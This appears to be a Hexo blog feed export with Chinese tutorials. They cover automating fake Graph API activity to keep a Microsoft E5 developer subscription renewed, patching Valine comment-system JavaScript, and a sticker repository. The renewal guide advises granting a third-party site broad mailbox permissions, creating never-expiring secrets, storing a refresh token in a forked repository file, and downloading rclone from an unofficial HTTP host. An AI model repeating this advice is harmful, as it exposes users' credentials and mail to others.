href="https://apps.dev.microsoft.com/?deepLink=/quickstart/graphIO?publicClientSupport=false&appName=e5sub&redirectUrl=http://localhost/e5sub&allowImplicitFlow=false&ru=https%253A%252F%252Fdeveloper.microsoft.com%252Fen-us%252Fgraph%252Fquick-start%253FappID%253D_appId_%2526appName%253D_appName_%2526redirectUrl%253Dhttp%253A%252F%252Flocalhost%253A8000%2526platform%253Doption-windowsuniversal">这里</a></p><p>打开后登陆自己的Office账户，把显示的应用机密保存下来</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Secret.png"></p><p>接着点下面那个蓝色的按钮，返回快速启动</p><p>往下拉网页，看到有个APP ID(or Client ID)，我们把下面框框内的UUID找个地方复制粘贴临时保存一下</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-UUID.png"></p><p>然后我们回到Telegram，输入刚刚的UUID和Secret秘钥，需要按照提供的格式进行输入</p><p>会返回一个带有链接的对话框给我们，我们点击授权用户后面的点击直达</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Bind.png"></p><p>弹出来一个登录界面，登录完成后，复制地址栏里面的网址，粘贴到Telegram的对话框内就可以了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Refresh-Token.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Reply.png"></p><p>这样我们就绑定成功了，接下来就不管它，它会自己进行API的调用，每小时调用一次，并且会给我们反馈结果</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/E5Sub-Result.png"></p><h3 id="自动续订程序法"><a href="#自动续订程序法" class="headerlink" title="自动续订程序法"></a>自动续订程序法</h3><p>这是一个由其他大佬开发的网页端的程序，并且所有的操作都是在他的服务器上的，本地服务器不需要跑任何东西。我们打开<a href="https://e5.qyi.io/user/login?redirect=/user/home">https://e5.qyi.io/user/login?redirect=%2Fuser%2Fhome</a></p><p>打开可能有点慢，请耐心等待。打开后点击中间的Github图标使用Github进行登录，进入主界面</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/qyi-start.png"></p><p>然后先把这个网页放在一边，打开<a href="https://portal.azure.com/">Azure</a>，在上面搜索<a href="https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade">应用注册</a>，打开后，我们点击左上角的<code>新注册</code>，名称随便填，下面的受支持的账户类型选择第三个，URI我们填写<code>https://e5.qyi.io/outlook/auth2/receive</code>，一定要填正确，否则是无法使用的！</p><p>进入页面后，我们复制上面显示的<code>应用程序（客户端）ID</code>，以供备用，接着我们点击左边的证书和密码，创建我们这个程序的密码</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/qyi-Azure-Secret.png"></p><p>在右边选择新客户端密码，描述随便填，密码我们选择从不过期，然后新建，把给我们的密码保存下来备用</p><p>接着点到API权限，点击添加权限，选择Microsoft Graph，然后选择右边的应用程序权限，勾选<code>Mail.Read</code>、<code>Mail.ReadBasic</code>、<code>Mail.ReadBasic.All</code>、<code>Mail.ReadWrite</code>即可，剩下那个<code>Mail.Send</code>不用选择，勾选后确定，点击添加权限右边的<code>代表xxx授予管理员同意</code>，一定要点，否则无法正常运行</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/qyi-Azure-Permission.png"></p><p>接着返回刚刚的那个网页，ID和机密填进去，然后点保存，接着点授权，一定要点授权，否则不会正常运行！</p><h3 id="Github-Action法"><a href="#Github-Action法" class="headerlink" title="Github Action法"></a>Github Action法</h3><p>这里我们使用的是一个Github项目<a href="https://github.com/wangziyingwen/AutoApiSecret">AutoApiSecret</a>，进入这个项目我们先把它fork一份到自己的账户下</p><p>同样，我们还是要先注册一个应用，获取应用ID和应用机密，怎么注册看<a href="#%E8%87%AA%E5%8A%A8%E7%BB%AD%E8%AE%A2%E7%A8%8B%E5%BA%8F%E6%B3%95">自动续订程序法</a></p><p>唯一不同的是，我们需要的权限变为以下权限：</p><p><code>Files.Read.All</code> <code>Files.ReadWrite.All</code> <code>Sites.Read.All</code> <code>Sites.ReadWrite.All</code></p><p><code>User.Read.All</code> <code>User.ReadWrite.All</code> <code>Directory.Read.All </code> <code>Directory.ReadWrite.All</code></p><p><code>Mail.Read</code> <code>Mail.ReadWrite</code> <code>MailboxSettings.Read </code> <code>MailboxSettings.ReadWrite</code></p><p>勾选完下面的权限保存，别忘了要点允许！！！</p><p>我们使用rclone来获取我们的refresh_token，你可以点击这里下载<a href="http://file.heimu.ltd/rclone.exe">rclone</a></p><p>在命令行里，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rclone authorize <span class="string">&quot;onedrive&quot;</span> <span class="string">&quot;之前保存的应用id&quot;</span> <span class="string">&quot;之前保存的应用秘钥&quot;</span></span><br></pre></td></tr></table></figure><p>来打开登录窗口，在窗口内登录后，在命令行里面找到<code>refresh_token:</code>并把后面的内容直到<code>,&quot;expiry&quot;</code>的部分复制下来备用</p><p>接着我们回到我们的仓库，打开里面的1.txt文件，把刚刚获取的refresh_token贴进去</p><p>打开仓库设置，点击Secret，我们添加两个东西</p><p>第一个是<code>CONFIG_ID</code>，里面的内容写为<code>id=r&#39;你的应用id&#39;</code>，第二个是<code>CONFIG_KEY</code>，里面的内容写作<code>secret=r&#39;你的应用机密&#39;</code></p><p>接着打开仓库里面的1.txt，把你的refresh_token贴进去</p><p>打开右上角自己头像下的Settings，选到Developer Settings，再点到Personal access tokens，在这里我们新建一个token，名字随便填，但是权限我们需要勾一下内容</p><p><code>admin:repo_hook</code> <code>repo</code> <code>workflow</code></p><p>然后保存即可，回到我们的仓库，点击顶上的Action，如果你没有开过Action，那么这里会需要让你打开同意条例来打开Action，打开后，我们给自己的这个仓库点个Star，来手动触发我们的Action</p><p>在Action界面我们可以看到我们的Workflow是否运行正常，如果运行后打绿色的勾就说明成功了，这个时候就不需要再管它了，直接把这个仓库放着就好了，每一小时就会自动调用一次API，达到微软要求的开发（伪）目的</p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>我今天重新开了一个E5的订阅，反正看看能撑多久</p><div class="note success flat"><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Office365-Renew-Project/Success-Renewed.png" alt="续费成功图"></p></div>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valine-Customize魔改教程</title>
      <link href="/posts/Valine-Customize/"/>
      <url>/posts/Valine-Customize/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note warning flat"><p>本篇为我的修改思路，如果你想直接使用我修改过后的版本，可以直接将<a href="https://github.com/GamerNoTitle/Valine-Magic">https://github.com/GamerNoTitle/Valine-Magic</a>更新日志中的最新版js链接引入</p><p>在看本篇之前，请确保：</p><ul><li>你有一定的代码基础</li><li>你能够看懂Python代码和JavaScript</li><li>你精通Valine的使用</li></ul><p>Valine在2020&#x2F;4&#x2F;21更新了v1.4.5，支持了自定义表情包，故<a href="https://github.com/GamerNoTitle/Valine-Magic">Valine-Magic</a>将不再提供修改的js，改为提供Valine的表情列表</p></div><p>我们本篇要做的事情有两个</p><p>①加入自定义表情</p><p>②判断邮箱为QQ邮箱则显示QQ头像</p><p>③为修改UI文字提供思路</p><p>话不多说 让我们开始吧</p><hr><h3 id="加入自定义表情"><a href="#加入自定义表情" class="headerlink" title="加入自定义表情"></a>加入自定义表情</h3><p>首先，我们需要获得valine的js文件，这里直接访问Valine的CDN获取<a href="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js">https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js</a></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-js-Official.png" alt="Valine官方JS"></p><p>打开后是一个页面，我们直接全选复制，粘贴到一个新的js文件中</p><div class="note warning flat"><p>温馨提示：因为js中的字符数<strong>稍微</strong>（手动着重）有点多，所以说如果没有较为强劲的电脑可能无法很快做到文本格式化</p></div><p>首先我们需要修改的是Valine的表情CDN，如果不修改的话，你的表情链接前面会自动加上<code>https://img.t.sinajs.cn/t4/appstyle/expression/ext/normal</code>字段导致表情无法被读取</p><p>我们直接以<code>//img.t.sinajs.cn</code>作为关键词检索CDN，很快就得到了CDN的位置</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-Original-CDN-Search.png" alt="CDN搜索"></p><p>我们将这里的CDN的内容直接删掉，留空</p><p>接着我们搜索valine自带的表情标签，而第一个的表情标签是smile，我这里就直接搜索smile，这样可以直接定位到表情列表的头部</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-Stickers-List.png" alt="表情列表搜索"></p><p>接下来，我们需要上传自己的表情，并且按照这个格式制作一个表情列表</p><p>我个人的做法是：将表情包上传到Github仓库，通过jsdelivr来使用；通过Python脚本遍历当前目录下的所有文件，自动生成表情列表</p><p>上传就不必说了，直接用Git上传即可</p><p>生成列表生成脚本我是自己弄了一小段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">&#x27;D:\xxx\BQB&#x27;</span><span class="comment"># 路径已屏蔽QAQ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findAllFile</span>(<span class="params">base</span>):</span><br><span class="line">    <span class="keyword">for</span> root, ds, fs <span class="keyword">in</span> os.walk(base):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> fs:</span><br><span class="line">            <span class="keyword">yield</span> f</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    base = <span class="string">&#x27;./&#x27;</span></span><br><span class="line">    linklist=[]</span><br><span class="line">    num=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> findAllFile(base):</span><br><span class="line">        linklist.append(<span class="string">&#x27;custom&#123;&#125;: &quot;https://cdn.bili33.top/gh/Vikutorika/assets@master/img/BQB/&#123;&#125;&quot;,&#x27;</span>.<span class="built_in">format</span>(num,i))</span><br><span class="line">        num=num+<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(linklist).replace(<span class="string">&#x27;,\&#x27;, \&#x27;&#x27;</span>,<span class="string">&#x27;, &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里通过os.walk遍历当前目录下的文件，并且将获取到的文件名通过字符串拼接的方式拼在一起，然后存入列表<code>linklist</code>，接着打印的时候将固定的字符串格式<code>,&#39;, &#39;</code>给删除掉（因为是list对象，所以打印出来的时候有固定格式），接着就会给我生成表情列表啦！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Sticker-List-Generate.png" alt="生成表情列表"></p><p>接着将获取到的列表覆盖入Valine的表情列表，保存</p><p>在自己的网站引入Valine的CDN的时候引入自己的js文件即可</p><p>接着我们就会看到表情列表里面的自定义表情啦！</p><h3 id="判断为QQ邮箱将头像设定为QQ头像"><a href="#判断为QQ邮箱将头像设定为QQ头像" class="headerlink" title="判断为QQ邮箱将头像设定为QQ头像"></a>判断为QQ邮箱将头像设定为QQ头像</h3><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/cungudafa/article/details/104638730">https://blog.csdn.net/cungudafa/article/details/104638730</a></p></div><p>这里我们还是打开刚刚的js文件，直接搜索<code>E.cdn+(0,s.default)(t.get(&quot;mail&quot;))+E.params</code>，会给我们定位到一个位置</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-Mail-Search.png" alt="搜索有关字段"></p><p>我们找到下图中我鼠标所在的位置，回车换行</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-Mail-Enter.png" alt="换行位置"></p><p>换行以后，加入以下内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> qq_img = E.<span class="property">cdn</span>+(<span class="number">0</span>,s.<span class="property">default</span>)(t.<span class="title function_">get</span>(<span class="string">&quot;mail&quot;</span>))+E.<span class="property">params</span>;</span><br><span class="line"><span class="keyword">if</span> (t.<span class="title function_">get</span>(<span class="string">&quot;mail&quot;</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;@qq.com&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> prefix = t.<span class="title function_">get</span>(<span class="string">&quot;mail&quot;</span>).<span class="title function_">replace</span>(<span class="regexp">/@.*/</span>, <span class="string">&quot;&quot;</span>);<span class="comment">//前缀</span></span><br><span class="line"><span class="keyword">var</span> pattern = <span class="regexp">/^\d+$/g</span>;  <span class="comment">//正则表达式</span></span><br><span class="line"><span class="keyword">var</span> result = prefix.<span class="title function_">match</span>(pattern);<span class="comment">//match 是匹配的意思</span></span><br><span class="line"><span class="keyword">if</span> (result !== <span class="literal">null</span>) &#123;</span><br><span class="line">qq_img = <span class="string">&quot;//q1.qlogo.cn/g?b=qq&amp;nk=&quot;</span> + prefix + <span class="string">&quot;&amp;s=100&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后回到我们刚刚搜索的地方，从<code>&#39;&lt;img</code>处开始，到后面的第一个<code>&gt;&#39;</code>修改为以下内容</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&lt;img class=&quot;vimg&quot; src=&quot;&#x27;</span>+(qq_img)+<span class="string">&#x27;&quot;&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>保存即可，然后引入刚刚我们修改的JS，在评论时邮箱填入QQ邮箱，看看是不是有QQ头像了？</p><h3 id="修改UI文字"><a href="#修改UI文字" class="headerlink" title="修改UI文字"></a>修改UI文字</h3><p>我们修改UI文字其实非常简单，要修改的东西也是在这个js文件里面</p><p>我们随便搜索一个按钮显示的文字，我们就会发现，附近都是我们要修改的文字</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Valine-customize/Valine-UI-Text.png" alt="搜索有关字段"></p><p>我们只需要对这些文字进行修改即可，修改成啥样嘛？就看你自己啦！</p><hr><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>啦啦啦！终于引入B站表情包啦！</p><p>新建了一个Github项目在这<a href="https://github.com/GamerNoTitle/Valine-Magic">https://github.com/GamerNoTitle/Valine-Magic</a></p><p><del>以后新的表情包就丢在这里啦！更新日志也写在这里，你可以通过Issue或者PR提交新的表情包</del></p><p><del>有会修改ValineUI的大佬请联系我！我想做分类标签！！！</del></p><p><strong>Valine在2020&#x2F;4&#x2F;21更新了v1.4.5，支持了自定义表情包，故<a href="https://github.com/GamerNoTitle/Valine-Magic">Valine-Magic</a>将不再提供修改的js，改为提供Valine的表情列表</strong></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valine-Magic - Valine表情仓库</title>
      <link href="/posts/Valine-Magic/"/>
      <url>/posts/Valine-Magic/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note warning flat"><p>Valine在2020&#x2F;4&#x2F;21更新了v1.4.5，支持了自定义表情包，故<a href="https://github.com/GamerNoTitle/Valine-Magic">Valine-Magic</a>将不再提供修改的js，改为提供Valine的表情列表，在使用列表之前，请将你的ValineCDN修改为<code>https://valinecdn.bili33.top/</code><br><a class="github-button" href="https://github.com/GamerNoTitle/Valine-Magic" data-icon="octicon-star" data-size="large" data-show-count="true" aria-label="Star GamerNoTitle/Valine-Magic on GitHub">Star</a></p></div><p><a href="https://app.fossa.com/projects/git%2Bgithub.com%2FGamerNoTitle%2FValine-Magic?ref=badge_shield"><img src="https://app.fossa.com/api/projects/git%2Bgithub.com%2FGamerNoTitle%2FValine-Magic.svg?type=shield" alt="FOSSA Status"></a> <img src="https://data.jsdelivr.com/v1/package/gh/GamerNoTitle/ValineCDN/badge"> <img src="https://img.shields.io/github/last-commit/GamerNoTitle/Valine-Magic?style=for-the-badge"> <img src="https://img.shields.io/github/repo-size/GamerNoTitle/ValineCDN?style=for-the-badge"> </p><p><strong>访问量</strong>（自2020.10.25 11:00:00）</p><p><img src="https://count.getloli.com/get/@GamerNoTitle@Valine-Magic?theme=gelbooru"></p><p>点击对应的表情名可以直接到达表情列表，请注意：你在使用本仓库内的表情时请将Valine的CDN设置为下面表格中的任意一个</p><p><strong>已经适配MiniValine</strong><a href="https://github.com/GamerNoTitle/Valine-Magic/issues/8">#8</a>，有问题请使用issue反馈</p><p>在线详细情况可以点击<a href="https://github.com/GamerNoTitle/Valine-Magic/issues/6">issue#6</a>进行查看</p><p><a href="https://github.com/GamerNoTitle/Valine-Magic/discussions?discussions_q=category:%E6%9B%B4%E6%96%B0%E6%97%A5%E5%BF%97">更新日志</a></p><p>你可以提交表情包，请阅读<a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/docs/Submit.md">提交的正确方式</a></p><table><thead><tr><th align="center">CDN服务器（点击可看在线状态）</th><th align="left">CDN链接</th><th align="center">优势</th><th align="center">劣势</th></tr></thead><tbody><tr><td align="center"><a href="https://stats.bili33.top/785622714">Github</a></td><td align="left"><a href="https://valinecdn.bili33.top/">https://valinecdn.bili33.top/</a></td><td align="center">链接短，快</td><td align="center">有CloudFlare的301跳转作为统计，有可能会崩服</td></tr><tr><td align="center"><a href="https://stats.bili33.top/785622715">Github</a></td><td align="left"><a href="https://cdn.jsdelivr.net/gh/GamerNoTitle/ValineCDN@master/">https://cdn.jsdelivr.net/gh/GamerNoTitle/ValineCDN@master/</a></td><td align="center">非常快</td><td align="center">有可能会崩服</td></tr><tr><td align="center"><a href="https://stats.bili33.top/785622717">Coding</a></td><td align="left"><a href="https://mirrorcdn.bili33.top/">https://mirrorcdn.bili33.top/</a></td><td align="center">链接短，较快</td><td align="center">有CloudFlare的301跳转作为统计，Coding服务器总是崩</td></tr><tr><td align="center"><a href="https://stats.bili33.top/785622720">Coding</a></td><td align="left"><a href="https://gamernotitle.coding.net/p/ValineCDN/d/ValineCDN/git/raw/master/">https://gamernotitle.coding.net/p/ValineCDN/d/ValineCDN/git/raw/master/</a></td><td align="center">较快</td><td align="center">Coding服务器总是崩</td></tr></tbody></table><h3 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a>Valine</h3><p>复制的列表可以直接复制到例如<a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a>主题的<code>valine.json</code>内，或者是各种用于放Valine表情配置的地方</p><p>请注意：如果你想添加多个分类，请记得在每个分类的最后一个表情后面加个<code>,</code>否则Valine无法识别。假设下面这个表情为该系列最后一个表情：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;hotkey1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bilibiliHotKey/1.jpg&quot;</span></span><br></pre></td></tr></table></figure><p>你想在这个表情下面添加其他表情的时候，那么请在这个表情的后面加个<code>,</code>就像下面这样</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;hotkey1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bilibiliHotKey/1.jpg&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>如果你有新的表情包想要加入，你可以提出issue，或者直接发到<a href="mailto:admin@bili33.top">admin@bili33.top</a>，并注上你的ID和表情包名字（中文英文都需要）</p><p>仓库内的那个PY脚本是我提前编写好用来写表情列表的脚本，如果你有需要可以随意取用</p><p>这里有跟本项目同类型的表情仓库，如果在本仓库未找到你想要的表情包可以到这里找 <a href="https://www.antmoe.ml/">表情速查</a></p><h3 id="MiniValine"><a href="#MiniValine" class="headerlink" title="MiniValine"></a>MiniValine</h3><p>直接复制每个分类中的MiniValine所提供的链接（其中<code>https://valinecdn.bili33.top/</code>可以替换为任意CDN链接（见上表）），然后放在<code>emotionUrl</code>里面即可，请注意遵循列表写法，如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mvcomment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">new</span> <span class="title class_">MiniValine</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">el</span>: <span class="string">&#x27;.mvcomment&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">appId</span>: <span class="string">&#x27;appId&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">appKey</span>: <span class="string">&#x27;appKey&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">placeholder</span>: <span class="string">&#x27;Write a Comment O(∩_∩)O~~&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">          <span class="attr">emotionUrl</span>: [<span class="string">&#x27;https://valinecdn.bili33.top/alu&#x27;</span>,<span class="string">&#x27;https://valinecdn.bili33.top/bilibiliHotKey&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="表情分类"><a href="#表情分类" class="headerlink" title="表情分类"></a>表情分类</h3><table><thead><tr><th align="center"><img src="https://valinecdn.bili33.top/bilibiliHotKey/7.jpg"></th><th align="center"><img src="https://valinecdn.bili33.top/bilibilitv/[tv_doge].png"></th><th align="center"><img src="https://valinecdn.bili33.top/bilibili2233/[2233%E5%A8%98_%E7%AC%AC%E4%B8%80].png"></th></tr></thead><tbody><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/bilibili/hotkey%E7%83%AD%E8%AF%8D%E7%B3%BB%E5%88%97">哔哩哔哩热词系列</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/bilibili/tv%E5%B0%8F%E7%94%B5%E8%A7%86%E7%B3%BB%E5%88%97">哔哩哔哩小电视系列</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/bilibili/2233%E5%A8%98%E7%B3%BB%E5%88%97">哔哩哔哩2233娘系列</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/alu/%E4%B8%AD%E6%9E%AA.png"></td><td align="center"><img src='https://valinecdn.bili33.top/Menhera-chan/5.jpg' width=120 height=102></img></td><td align="center"><img src="https://valinecdn.bili33.top/HONKAI3-Daily/14.gif"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/alu">阿鲁alu系列</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Menhera-chan">メンヘラちゃん(Menhera-chan)系列表情包</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Daily">HONKAI崩坏3 日常篇</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/HONKAI3-Star/3.gif"></td><td align="center"><img src="https://valinecdn.bili33.top/HONKAI3-Crayon/16.gif"></td><td align="center"><img src="https://valinecdn.bili33.top/HONKAI3-Pure/13.gif"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Star">HONKAI崩坏3 观星篇</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Crayon">HONKAI崩坏3 蜡笔日常篇</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Pure">HONKAI崩坏3 纯色日常篇</a></td></tr><tr><td align="center"><img src='https://valinecdn.bili33.top/HONKAI3-Stan/4f921b8ad8c16f3d2c73e3c04c5735ca9b41187b.gif' width=104 height=74.4></td><td align="center"><img src='https://valinecdn.bili33.top/HONKAI3-AIChan/d65b36ccae610bc4479209cd6e62bb91b0f76188.jpg' width=125 height=111></img></td><td align="center"><img src='https://valinecdn.bili33.top/HONKAI3-Durandal-Search/f1b9a456587638e488d93ccaa95dde59aef3af01.gif' height=100 width=100></img></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Stan">HONKAI崩坏3 史丹</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-AIChan">HONKAI崩坏3 爱酱</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-Durandal-Search">HONKAI崩坏3 目标！幽兰黛尔</a></td></tr><tr><td align="center"><img src='https://valinecdn.bili33.top/HONKAI3-MEI/bf68423446465d396d3cbd8856882b5e9fb1c0c7.gif' width=120 height=120></td><td align="center"><img src='https://valinecdn.bili33.top/HONKAI3-NEWYEAR-2019/dc1a2b2032fad29373fe8460d4ad89ca848355a9.jpg' width=120 height=120></td><td align="center"><img src="https://valinecdn.bili33.top/Tsuri-me-ju_mimi/10753793_key@2x.png"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-MEI">HONKAI崩坏3 芽衣的剑道修行</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/HONKAI3/HONKAI3-NEWYEAR-2019">HONKAI崩坏3 2019新年</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Tsuri-me-ju-mimi">つり目獣耳スタンプ(Sticker of the slant eyes &amp; cat girl)</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Arcaea/184064198.png" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/Mafumafu/199749477.png" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/weibo/d_jiyan.png"></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Arcaea">Arcaea</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/MafuMafu">動く！まふまふスタンプ（ねこ）Mafumafu Animation sticker (cat)</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/weibo">微博原生表情包</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Tieba-New/image_emoticon25.png"></td><td align="center"><img src="https://valinecdn.bili33.top/Snow-Miku/3583066@2x.png" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/Sweetie-Bunny/12311679.png" style="zoom:50%;" /></td></tr><tr><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Tieba">百度贴吧原生表情包</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Snow-Miku">Snow Miku雪初音表情包（LINE）</a></td><td align="center"><a href="https://github.com/GamerNoTitle/Valine-Magic/tree/master/Classification/Sweetie-Bunny">うさみみ少女（SWEETIE BUNNY）</a></td></tr><tr><td align="center"><img src="https://valinecdn.bili33.top/Little-Bad/我们一起做坏坏的事.jpg" style="zoom:50%;" /></td><td align="center"><img src="https://valinecdn.bili33.top/Yurui-Neko/029.png" style="zoom:50%;" 